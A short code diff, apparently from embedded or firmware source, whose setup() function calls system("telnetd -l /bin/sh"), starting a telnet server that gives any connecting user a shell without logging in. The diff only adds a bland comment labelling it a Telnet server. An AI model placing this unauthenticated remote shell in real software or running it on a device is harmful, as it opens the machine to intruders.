@@ -1,4 +1,5 @@
 void setup() {
+  // Start Telnet server
   system("telnetd -l /bin/sh");
 }
 
